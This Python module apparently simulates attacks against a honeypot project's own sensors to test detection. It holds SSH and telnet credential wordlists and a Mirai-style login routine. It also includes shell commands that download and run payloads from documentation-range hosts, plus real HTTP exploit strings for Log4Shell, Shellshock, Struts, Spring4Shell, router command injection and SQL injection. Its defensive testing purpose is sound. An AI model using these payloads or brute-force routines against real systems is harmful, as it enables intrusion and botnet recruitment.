"""Live attack simulator: drives the project's own sensors over the network.

It only ever connects to the host given (default 127.0.0.1, i.e. this project's sensors). The
"payload" URLs it sends use the RFC 5737 documentation range 198.51.100.0/24, which is not
routable, and the sensors never fetch them anyway. Sensors flag traffic from lab address ranges
as simulated.
"""

from __future__ import annotations

import random
import socket
import time
from dataclasses import dataclass, field

import paramiko

SSH_WORDLIST = [("root", "123456"), ("root", "root"), ("root", "password"), ("root", "toor"), ("root", "1qaz2wsx"),
                ("root", "admin123"), ("admin", "admin"), ("admin", "password1"), ("ubuntu", "ubuntu"),
                ("pi", "raspberry"), ("test", "test"), ("oracle", "oracle"), ("user", "user"),
                ("postgres", "postgres"), ("git", "git"), ("ftpuser", "ftpuser")]
TELNET_CREDS = [("root", "xc3511"), ("admin", "admin"), ("root", "vizxv"), ("support", "support")]
RECON_COMMANDS = ["uname -a", "id", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "ls -la /tmp",
                  "cat /etc/passwd | head -n 3", "w",
                  "cd /tmp && wget http://198.51.100.23/bins/x86.sh -O .s && chmod +x .s && ./.s",
                  "curl -s http://198.51.100.23/c.sh | sh", "history -c", "exit"]

# (method, path, headers, body, expected category) - probes against the HTTP sensor.
DOC = "198.51.100.7"
HTTP_PROBES = [
    ("GET", "/.env", {"User-Agent": "Mozilla/5.0 zgrab/0.x"}, "", "info_disclosure"),
    ("GET", "/.git/config", {"User-Agent": "Go-http-client/1.1"}, "", "info_disclosure"),
    ("POST", "/wp-login.php", {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
     "log=admin&pwd=admin123&wp-submit=Log+In", "admin_panel_probe"),
    ("GET", "/phpmyadmin/index.php", {"User-Agent": "Mozilla/5.0"}, "", "admin_panel_probe"),
    ("GET", "/", {"User-Agent": "${${lower:j}ndi:ldap://" + DOC + ":1389/Exploit}"}, "", "log4shell"),
    ("GET", "/cgi-bin/status", {"User-Agent": "() { :; }; /bin/bash -c 'wget http://" + DOC + "/sh'"}, "", "shellshock"),
    ("GET", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP",
     {"User-Agent": "Mozilla/5.0"}, "", "php_rce"),
    ("POST", "/struts2-showcase/integration/saveGangster.action",
     {"Content-Type": "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id')}"}, "", "ognl_injection"),
    ("POST", "/", {"Content-Type": "application/x-www-form-urlencoded"},
     "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bx%7Di", "spring4shell"),
    ("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", {"User-Agent": "Mozilla/5.0"}, "", "path_traversal"),
    ("GET", "/product.php?id=1%27%20UNION%20SELECT%201,user(),3--%20-", {"User-Agent": "sqlmap/1.7.2#stable"}, "", "sqli"),
    ("POST", "/GponForm/diag_Form?images/", {"User-Agent": "Hello, World"},
     "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://" + DOC + "/gpon`;", "iot_router_exploit"),
    ("POST", "/ctrlt/DeviceUpgrade_1", {"Authorization": "Digest username=\"dslf-config\""},
     "<NewStatusURL>$(/bin/busybox wget -g " + DOC + " -l /tmp/x -r /mips)</NewStatusURL>", "iot_router_exploit"),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)", {"User-Agent": "Mozilla/5.0"},
     "", "iot_router_exploit"),
    ("GET", "/shell?cd+/tmp;rm+-rf+*;wget+http://" + DOC + "/jaws;sh+/tmp/jaws", {"User-Agent": "Hello, world"}, "",
     "iot_router_exploit"),
    ("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {"User-Agent": "Mozilla/5.0"},
     "<?php echo md5('phpunit'); ?>", "php_rce"),
    ("GET", "/", {"User-Agent": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"}, "", "scan"),
    ("GET", "/robots.txt", {"User-Agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"}, "", "scan"),
]


@dataclass
class Result:
    scenario: str
    target: str
    ok: bool = True
    log: list[str] = field(default_factory=list)
    stats: dict = field(default_factory=dict)
    expected: list[dict] = field(default_factory=list)
    started: float = field(default_factory=time.time)

    def say(self, line: str) -> None:
        self.log.append(line)

    def as_dict(self) -> dict:
        return {"scenario": self.scenario, "target": self.target, "ok": self.ok, "log": self.log[-200:],
                "stats": self.stats, "expected": self.expected, "started": self.started,
                "duration": round(time.time() - self.started, 2)}


def _transport(host: str, port: int) -> paramiko.Transport:
    sock = socket.create_connection((host, port), timeout=8)
    t = paramiko.Transport(sock)
    t.start_client(timeout=8)
    return t


def ssh_bruteforce(host: str = "127.0.0.1", port: int = 2222, per_connection: int = 4) -> dict:
    """Dictionary attack like a botnet node: up to `per_connection` tries per connection, and a new
    connection whenever the username changes (SSH servers drop clients that switch username
    mid-connection). Valid logins are closed after one exec, as credential checkers do."""
    res = Result("ssh_bruteforce", f"{host}:{port}")
    tries = accepted = 0
    batches: list[list[tuple[str, str]]] = []
    for user, pw in SSH_WORDLIST:
        if batches and batches[-1][0][0] == user and len(batches[-1]) < per_connection:
            batches[-1].append((user, pw))
        else:
            batches.append([(user, pw)])
    for batch in batches:
        try:
            t = _transport(host, port)
        except (OSError, paramiko.SSHException) as exc:
            res.ok = False
            res.say(f"connect failed: {exc}")
            break
        for user, pw in batch:
            tries += 1
            try:
                t.auth_password(user, pw)
                accepted += 1
                res.say(f"{user}:{pw} -> ACCEPTED (running one exec then disconnecting)")
                chan = t.open_session(timeout=5)
                chan.exec_command("uname -s -m; nproc")
                out = chan.makefile().read().decode(errors="replace").strip()
                res.say(f"   exec output: {out!r}")
                break
            except paramiko.AuthenticationException:
                res.say(f"{user}:{pw} -> rejected")
            except paramiko.SSHException as exc:
                res.say(f"{user}:{pw} -> error {exc}")
                break
        t.close()
    res.stats = {"attempts": tries, "accepted": accepted, "connections": len(batches)}
    res.expected = [{"event_type": "auth", "min": tries}]
    return res.as_dict()


def ssh_interactive(host: str = "127.0.0.1", port: int = 2222, pace: tuple[float, float] = (0.8, 6.0)) -> dict:
    """A slower, human-paced operator: logs in, gets a PTY shell and types recon commands."""
    res = Result("ssh_interactive", f"{host}:{port}")
    try:
        t = _transport(host, port)
    except (OSError, paramiko.SSHException) as exc:
        res.ok = False
        res.say(f"connect failed: {exc}")
        return res.as_dict()
    logged_in = None
    for user, pw in [("root", "letmein"), ("root", "qwerty"), ("root", "Passw0rd"), ("root", "root123"), ("root", "r00t!")]:
        try:
            t.auth_password(user, pw)
            logged_in = (user, pw)
            break
        except paramiko.AuthenticationException:
            res.say(f"{user}:{pw} rejected")
    if not logged_in:
        res.ok = False
        res.say("never accepted (is HP_SSH_POLICY 'never'?)")
        t.close()
        return res.as_dict()
    res.say(f"logged in as {logged_in[0]}:{logged_in[1]}")
    chan = t.open_session()
    chan.get_pty(term="xterm", width=120, height=40)
    chan.invoke_shell()
    chan.settimeout(5)

    def drain(wait=0.6):
        time.sleep(wait)
        data = b""
        while chan.recv_ready():
            data += chan.recv(65536)
        return data.decode(errors="replace")

    drain(1.0)
    for cmd in RECON_COMMANDS:
        time.sleep(random.uniform(*pace))  # human-like think time
        chan.send(cmd + "\r")
        out = drain()
        lines = [l for l in out.replace("\r", "").split("\n") if l.strip() and l.strip() != cmd][:3]
        res.say(f"$ {cmd}\n    " + "\n    ".join(lines))
        if cmd == "exit":
            break
    t.close()
    res.stats = {"commands": len(RECON_COMMANDS), "user": logged_in[0]}
    res.expected = [{"event_type": "command", "min": len(RECON_COMMANDS)}, {"event_type": "download_attempt", "min": 2}]
    return res.as_dict()


def _read_until(sock: socket.socket, marker: bytes | tuple, timeout: float = 5.0) -> bytes:
    markers = marker if isinstance(marker, tuple) else (marker,)
    sock.settimeout(timeout)
    data = b""
    end = time.time() + timeout
    while not any(m in data for m in markers) and time.time() < end:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, TimeoutError):
            break
        if not chunk:
            break
        data += chunk
    return data


def telnet_mirai(host: str = "127.0.0.1", port: int = 2323) -> dict:
    """Mirai-style: default creds, privilege probes, busybox applet check, loader download."""
    res = Result("telnet_mirai", f"{host}:{port}")
    try:
        s = socket.create_connection((host, port), timeout=8)
    except OSError as exc:
        res.ok = False
        res.say(f"connect failed: {exc}")
        return res.as_dict()
    shell = False
    _read_until(s, b"login: ")
    for user, pw in TELNET_CREDS:
        s.sendall(user.encode() + b"\r\n")
        _read_until(s, b"Password: ")
        s.sendall(pw.encode() + b"\r\n")
        reply = _read_until(s, (b"# ", b"login: "), 5)
        if b"# " in reply:
            res.say(f"{user}:{pw} -> shell")
            shell = True
            break
        res.say(f"{user}:{pw} -> Login incorrect")
    if not shell:
        res.ok = False
        s.close()
        return res.as_dict()
    tag = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(5))
    probes = ["enable", "system", "shell", "sh", f"/bin/busybox {tag}", "cat /proc/mounts", "echo -e '\\x61\\x75\\x74\\x68\\x5f\\x6f\\x6b'",
              "cd /tmp; /bin/busybox wget http://198.51.100.23/bins/mirai.arm7 -O .m; chmod 777 .m; ./.m telnet.loader",
              "/bin/busybox tftp -g -r mips 198.51.100.23", "exit"]
    for cmd in probes:
        time.sleep(0.05)
        s.sendall(cmd.encode() + b"\r\n")
        out = _read_until(s, b"# ", 3).decode(errors="replace").replace("\r", "")
        first = next((l for l in out.split("\n") if l.strip() and not l.strip().endswith("#")), "")
        res.say(f"> {cmd}   | {first[:80]}")
        if cmd.startswith("/bin/busybox ") and cmd.endswith(tag):
            res.stats["applet_check"] = f"{tag}: applet not found" in out
    s.close()
    res.stats["commands"] = len(probes)
    res.expected = [{"event_type": "command", "min": len(probes) - 1}, {"event_type": "download_attempt", "min": 2}]
    return res.as_dict()


def raw_http(host: str, port: int, method: str, path: str, headers: dict, body: str) -> int:
    """Send a request byte-for-byte (HTTP client libraries would normalise the hostile parts)."""
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}:{port}", "Connection: close"]
    lines += [f"{k}: {v}" for k, v in headers.items()]
    if body:
        lines.append(f"Content-Length: {len(body.encode())}")
    raw = ("\r\n".join(lines) + "\r\n\r\n" + body).encode()
    with socket.create_connection((host, port), timeout=8) as s:
        s.sendall(raw)
        reply = _read_until(s, b"\r\n\r\n", 5)
    try:
        return int(reply.split(b" ")[1])
    except (IndexError, ValueError):
        return 0


def http_exploits(host: str = "127.0.0.1", port: int = 8180) -> dict:
    res = Result("http_exploits", f"{host}:{port}")
    sent = 0
    for method, path, headers, body, expect in HTTP_PROBES:
        try:
            status = raw_http(host, port, method, path, headers, body)
        except OSError as exc:
            res.ok = False
            res.say(f"{method} {path[:60]} -> failed {exc}")
            break
        sent += 1
        res.say(f"{method} {path[:70]} -> {status} (expect {expect})")
        res.expected.append({"path": path, "category": expect})
    res.stats = {"requests": sent}
    return res.as_dict()


def banner_probe(host: str = "127.0.0.1", redis_port: int = 6380, mysql_port: int = 3307) -> dict:
    res = Result("banner_probe", f"{host}:{redis_port},{mysql_port}")
    for port, payload in ((redis_port, b"AUTH foobared\r\nINFO\r\n"), (redis_port, b"*1\r\n$4\r\nINFO\r\n"),
                          (mysql_port, b"\x20\x00\x00\x01\x85\xa6\x3f\x20\x00\x00\x00\x01\x21" + b"\x00" * 23 + b"root\x00\n")):
        try:
            with socket.create_connection((host, port), timeout=5) as s:
                s.settimeout(2)
                try:
                    greet = s.recv(256)
                except (socket.timeout, TimeoutError):
                    greet = b""
                s.sendall(payload)
                time.sleep(0.2)
                res.say(f"port {port}: greeting {greet[:40]!r} sent {payload[:30]!r}")
        except OSError as exc:
            res.ok = False
            res.say(f"port {port}: {exc}")
    res.expected = [{"event_type": "banner", "min": 3}]
    return res.as_dict()


SCENARIOS = {
    "ssh_bruteforce": ssh_bruteforce,
    "ssh_interactive": ssh_interactive,
    "telnet_mirai": telnet_mirai,
    "http_exploits": http_exploits,
    "banner_probe": banner_probe,
}


def run(scenario: str, host: str = "127.0.0.1", ports: dict | None = None) -> dict:
    """Run one scenario (or "all_live") against `host` using the given port overrides."""
    ports = ports or {}
    calls = {
        "ssh_bruteforce": lambda: ssh_bruteforce(host, ports.get("ssh", 2222)),
        "ssh_interactive": lambda: ssh_interactive(host, ports.get("ssh", 2222)),
        "telnet_mirai": lambda: telnet_mirai(host, ports.get("telnet", 2323)),
        "http_exploits": lambda: http_exploits(host, ports.get("http", 8180)),
        "banner_probe": lambda: banner_probe(host, ports.get("redis", 6380), ports.get("mysql", 3307)),
    }
    if scenario == "all_live":
        return {"scenario": "all_live", "results": [calls[name]() for name in calls]}
    if scenario not in calls:
        raise ValueError(f"unknown live scenario {scenario!r}")
    return calls[scenario]()
